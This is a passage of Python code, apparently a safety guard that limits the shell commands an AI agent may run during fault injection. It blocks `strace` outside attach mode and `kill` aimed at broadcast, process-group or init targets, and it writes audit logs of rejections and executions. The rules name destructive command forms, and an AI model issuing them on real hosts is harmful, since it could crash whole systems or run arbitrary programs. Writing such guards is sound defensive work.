        launched program is bounded by nothing. Requiring ``-p`` keeps the target
        an already-running, explicitly named process.
        """
        has_pid = False
        for arg in cmd[1:]:
            if arg.startswith("-p") or arg.startswith("--attach"):
                has_pid = True
                break
        if not has_pid:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="strace is admitted only in attach mode",
                compliant_form=(
                    "Attach to a running process: `strace -p <pid> "
                    "-e trace=<syscall>`. Without `-p`, strace RUNS its "
                    "argument, which is arbitrary execution rather than "
                    "tracing; get the PID from host_read first."
                ),
            )
        return None

    def _check_kill(self, cmd: list[str]) -> GuardFeedback | None:
        """Lock ``kill`` to explicit PID target(s) > 1.

        Signal flags (``-9`` / ``-STOP`` / ``-CONT`` / ``-s SIGKILL`` …) are
        allowed. Broadcast (``-1``), init / ``0`` and PID ``1`` targets are
        rejected so the blast radius is a single, explicitly named process.

        A NUMERIC dash-token (``-9``) is a signal spec only while NO signal has
        been given yet. Once one has (``-9`` / ``-SIGTERM`` / ``-s SIGKILL``),
        a later one is a NEGATIVE PID — the POSIX process-group form:
        ``kill -9 -123 456`` signals pgid 123, blowing well past the
        single-process intent.

        Every rejection carries the token that tripped it, so the model does not
        have to re-derive which of several arguments the guard objected to.

        None of these are ``is_hard_floor``: every one is fixed by naming a
        different PID, so the path IS viable once expressed correctly. Marking
        them a dead-end while also handing over a ``compliant_form`` would tell
        the model to abandon a signal-based fault it can legitimately perform.
        (``is_hard_floor`` describes a boundary that will not relax — it may
        still point at ANOTHER route, as the binary whitelist does toward
        ``host_read``; what it must never do is imply that editing the SAME
        command would pass.)
        """
        resolve_first = (
            "Resolve the concrete PID first (host_read 'pgrep -f <pattern>' or "
            "'ps aux'), then kill that single numeric PID."
        )
        pid_seen = False
        expect_sig_value = False
        signal_seen = False
        for arg in cmd[1:]:
            # Broadcast / init / process-group targets — always reject.
            if arg in ("-1", "0", "-0"):
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"kill broadcast/init target not allowed: {arg}",
                    offending=arg,
                    compliant_form=(
                        "'-1' signals EVERY process the user may signal and "
                        "'0'/'-0' the whole process group — neither is a "
                        "single-process fault. " + resolve_first
                    ),
                )
            if expect_sig_value:  # value token following -s / --signal
                expect_sig_value = False
                continue
            if arg in ("-s", "--signal"):
                expect_sig_value = True
                signal_seen = True
                continue
            if arg.startswith("-"):
                if re.fullmatch(r"-\d+", arg) and (signal_seen or pid_seen):
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason=f"kill process-group target not allowed: {arg}",
                        offending=arg,
                        compliant_form=(
                            f"A signal was already given, so '{arg}' reads as "
                            f"NEGATIVE PID — POSIX for 'signal process group "
                            f"{arg.lstrip('-')}', not one process. Pass the "
                            "positive PID instead."
                        ),
                    )
                # Signal flag (-9 / -STOP / -SIGKILL …) — allowed.
                signal_seen = True
                continue
            if arg.isdigit():
                if int(arg) <= 1:
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason=f"kill target PID must be > 1 (got {arg})",
                        offending=arg,
                        compliant_form=(
                            "PID 1 is the container/host init — signalling it "
                            "takes down everything, and PID 0 is the process "
                            "group. " + resolve_first
                        ),
                    )
                pid_seen = True
            else:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"kill requires an explicit numeric PID: {arg}",
                    offending=arg,
                    compliant_form=(
                        "Process names and command substitution are not "
                        "resolved here (exec-form runs no shell). " + resolve_first
                    ),
                )
        if not pid_seen:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="kill requires an explicit PID target",
                compliant_form=resolve_first,
            )
        return None

    def audit_rejection(self, cmd: list[str], feedback: GuardFeedback) -> None:
        """Record a REJECTION audit entry.

        Both execution call sites raise on rejection BEFORE ``audit_log``
        can fire (and a rejection has no ``CommandResult`` to log), so
        without this entry the guard's own interception left no trace.
        Same JSONL shape as ``audit_log``, plus the full feedback —
        including evidence spans for audit / SSE / TUI highlight
        (design 4.7: a rejection is a fact, and facts get recorded).
        """
        log_entry = {
            "timestamp": now_iso(),
            "rejected": True,
            "command": cmd,
            "constraint": feedback.constraint.value,
            "reason": feedback.reason,
            "offending": feedback.offending,
            "is_hard_floor": feedback.is_hard_floor,
            "evidence": [asdict(span) for span in feedback.evidence],
        }
        logger.info(json.dumps(log_entry, ensure_ascii=False))

    def audit_log(
        self,
        cmd: list[str],
        result: CommandResult,
        task_id: str = "",
        *,
        transient_retries: int = 0,
    ) -> None:
        """Record an execution audit log entry.

        ``transient_retries`` (O1): how many transport-level transient
        dispatch retries preceded this FINAL result. Zero retries keep the
        entry shape unchanged; a non-zero count is added as its own key so
        downstream frequency statistics (how often a channel blips) can
        group on the audit trail instead of under-counting — the retries
        themselves leave no other record (one guard pass, one audit entry
        by design; the mid-loop warnings are log-only).
        """
        log_entry = {
            "timestamp": now_iso(),
            "task_id": task_id,
            "command": cmd,
            "exit_code": result.exit_code,
            "duration_ms": round(result.duration_ms, 1),
        }
        if transient_retries:
            log_entry["transient_retries"] = transient_retries
        logger.info(json.dumps(log_entry, ensure_ascii=False))
